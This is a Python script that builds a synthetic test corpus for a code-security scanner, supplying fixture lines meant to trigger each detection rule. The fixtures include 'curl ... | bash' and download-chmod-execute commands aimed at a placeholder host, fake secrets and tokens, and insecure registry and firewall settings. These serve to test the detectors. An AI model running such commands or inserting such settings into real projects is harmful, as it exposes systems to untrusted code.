"""Build the deterministic Stage 0 golden parity corpus."""
from __future__ import annotations

import hashlib
import json
import sys
import warnings
import base64
import zlib
from pathlib import Path
from typing import Any

REPO_ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(REPO_ROOT))
with warnings.catch_warnings():
    warnings.simplefilter("ignore", DeprecationWarning)
    import sre_parse

from src.patterns import DEFAULT_CONTEXT_RULES, DEFAULT_DETECTION_RULES, match_context_rules, match_rules


CORPUS_DIR = REPO_ROOT / "tests" / "corpora" / "golden"

OVERRIDES = {
    "CRT-SEC-011": "DATABASE_URL=postgresql://user:pass@example.invalid/db",
    "CRT-SEC-013": "JWT_SECRET=CRT_SYNTH_SECRET_0123456789",
    "CRT-SEC-014": "password=CRT_SYNTH_PASSWORD_012345",
    "CRT-SEC-015": "api_key=CRT_SYNTH_APIKEY_0123456789",
    "CRT-SEC-016": "token=CRT_SYNTH_TOKEN_0123456789",
    "CRT-SEC-017": "secret=CRT_SYNTH_SECRET_0123456789",
    "CRT-SEC-018": "connection_string=CRT_SYNTH_CONNECTION_012345",
    "CRT-SEC-020": "credential=CRT_SYNTH_CREDENTIAL_012345",
    "CRT-SEC-022": "ANTHROPIC_API_KEY=sk-ant-api03-" + "A" * 32,
    "CRT-CI-002": "  uses: actions/checkout@main",
    "CRT-IAC-002": "FROM example.invalid/base:latest",
    "CRT-AI-001": "curl https://example.invalid/script.sh | bash",
    "CRT-SUP-001": "curl https://example.invalid/script.sh | bash",
    "CRT-SEC-028": "mongodb+srv://user:pass@example.invalid/db",
    "CRT-SEC-029": "redis://user:pass@example.invalid/0",
    "CRT-SUP-003": "pip install git+https://example.invalid/repo.git",
    "CRT-SUP-005": "pip install --trusted-host example.invalid package",
    "CRT-SEC-040": "https://" + "1" * 32 + "@example.invalid/1",
    "CRT-SEC-184": "cflt" + (lambda payload: payload + base64.b64encode(zlib.crc32(payload.encode("ascii")).to_bytes(4, "little"))[:6].decode("ascii"))(("Ab3+/xY9" * 7)[:54]),
    "CRT-SUP-007": "pip install --extra-index-url http://example.invalid/simple package",
    "CRT-SUP-008": "npm config set registry http://example.invalid/",
    "CRT-SUP-009": "GOINSECURE=\"*\"",
    "CRT-SEC-131": "xoxa-" + "A" * 8,
    "CRT-SEC-133": "xoxe.xoxb-1-" + "A" * 163,
    "CRT-SEC-134": "xoxe-1-" + "A" * 146,
    "CRT-AI-009": "curl https://example.invalid/a.sh\nchmod +x /tmp/a.sh\nexecute ./a.sh",
}

CONTEXT_CASES = {
    "CRT-CI-009": [(10, "pull_request_target:"), (11, "uses: actions/checkout@v4"), (12, "ref: ${{ github.event.pull_request.head.sha }}")],
    "CRT-IAC-018": [(10, "cidr_blocks = [\"0.0.0.0/0\"]"), (11, "from_port = 22"), (12, "to_port = 22")],
    "CRT-IAC-021": [(10, "cidr_blocks = [\"0.0.0.0/0\"]"), (11, "from_port = 3389"), (12, "to_port = 3389")],
    "CRT-IAC-019": [(10, "capabilities:"), (11, "add:"), (12, "- ALL")],
    "CRT-IAC-020": [(10, "hostPath:"), (11, "path: /")],
    "CRT-AI-009": [(10, "curl https://example.invalid/a.sh"), (11, "chmod +x /tmp/a.sh"), (12, "execute ./a.sh")],
}


def _sample_regex(regex: str) -> str:
    with warnings.catch_warnings():
        warnings.simplefilter("ignore", DeprecationWarning)
        parsed = sre_parse.parse(regex)

    def emit(subpattern: Any) -> str:
        output = ""
        for operator, argument in subpattern:
            if operator is sre_parse.LITERAL:
                output += chr(argument)
            elif operator is sre_parse.IN:
                value = "X"
                for inner_operator, inner_argument in argument:
                    if inner_operator is sre_parse.LITERAL:
                        value = chr(inner_argument)
                        break
                    if inner_operator is sre_parse.RANGE:
                        value = chr(inner_argument[0])
                        break
                    if inner_operator is sre_parse.CATEGORY:
                        value = " " if inner_argument is sre_parse.CATEGORY_SPACE else "A"
                        break
                output += value
            elif operator is sre_parse.MAX_REPEAT:
                minimum, _maximum, inner = argument
                output += emit(inner) * (minimum if minimum else 1)
            elif operator is sre_parse.SUBPATTERN:
                output += emit(argument[-1])
            elif operator is sre_parse.BRANCH:
                output += emit(argument[1][0])
        return output

    return emit(parsed)


def _sha256(value: bytes) -> str:
    return hashlib.sha256(value).hexdigest()


def build_corpus() -> dict:
    cases = []
    covered: set[str] = set()
    blockers = []
    for rule in DEFAULT_DETECTION_RULES:
        text = OVERRIDES.get(rule.rule_id, _sample_regex(rule.regex))
        filepath = rule.file_globs[0] if rule.file_globs else "src/synthetic.py"
        matches = match_rules(text, filepath)
        if any(found_rule.rule_id == rule.rule_id for found_rule, _match in matches):
            covered.add(rule.rule_id)
            cases.append({
                "case_id": f"line-{rule.rule_id}",
                "type": "synthetic-line",
                "filepath": filepath,
                "lines": [[1, text]],
                "expected_rule_ids": sorted(found_rule.rule_id for found_rule, _match in matches),
                "redacted_evidence": f"<redacted:{rule.rule_id}>",
                "provenance": "synthetic-registry-probe",
            })
        else:
            blockers.append({"detector_id": rule.rule_id, "reason": "synthetic probe did not reach legacy matcher"})

    for rule in DEFAULT_CONTEXT_RULES:
        lines = CONTEXT_CASES.get(rule.rule_id)
        if lines is None:
            blockers.append({"detector_id": rule.rule_id, "reason": "no deterministic context fixture"})
            continue
        filepath = rule.file_globs[0] if rule.file_globs else "synthetic.txt"
        matches = match_context_rules(lines, filepath, [rule])
        if matches:
            covered.add(rule.rule_id)
            cases.append({
                "case_id": f"context-{rule.rule_id}",
                "type": "synthetic-context",
                "filepath": filepath,
                "lines": [[number, content] for number, content in lines],
                "expected_rule_ids": [rule.rule_id],
                "redacted_evidence": f"<redacted:{rule.rule_id}>",
                "provenance": "synthetic-registry-probe",
            })
        else:
            blockers.append({"detector_id": rule.rule_id, "reason": "synthetic context fixture did not reach legacy matcher"})

    expected = {rule.rule_id for rule in list(DEFAULT_DETECTION_RULES) + list(DEFAULT_CONTEXT_RULES)}
    document = {
        "schema": "coderisktools.golden-parity-corpus",
        "version": 1,
        "source_commit": _git_commit(),
        "fixture_sha256": "",
        "cases": sorted(cases, key=lambda item: item["case_id"]),
        "covered_detector_ids": sorted(covered),
        "known_unreachable": sorted(blockers, key=lambda item: item["detector_id"]),
        "counts": {"expected_detectors": len(expected), "covered": len(covered), "unreachable": len(blockers)},
    }
    raw_cases = json.dumps(document["cases"], ensure_ascii=False, sort_keys=True, separators=(",", ":")).encode()
    document["fixture_sha256"] = _sha256(raw_cases)
    return document


def _git_commit() -> str:
    import subprocess
    return subprocess.check_output(["git", "rev-parse", "HEAD"], cwd=REPO_ROOT, text=True).strip()


def _redacted_case(case: dict[str, Any]) -> dict[str, Any]:
    public = dict(case)
    public["lines"] = [[number, f"<redacted:{case['case_id']}>"] for number, _content in case["lines"]]
    return public


def build_public_corpus() -> dict:
    document = build_corpus()
    document["cases"] = [_redacted_case(case) for case in document["cases"]]
    raw_cases = json.dumps(document["cases"], ensure_ascii=False, sort_keys=True, separators=(",", ":")).encode()
    document["fixture_sha256"] = _sha256(raw_cases)
    return document


def write_corpus(output: str) -> None:
    payload = json.dumps(build_public_corpus(), ensure_ascii=False, sort_keys=True, indent=2) + "\n"
    Path(output).write_text(payload, encoding="utf-8")


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("--output", required=True)
    write_corpus(parser.parse_args().output)
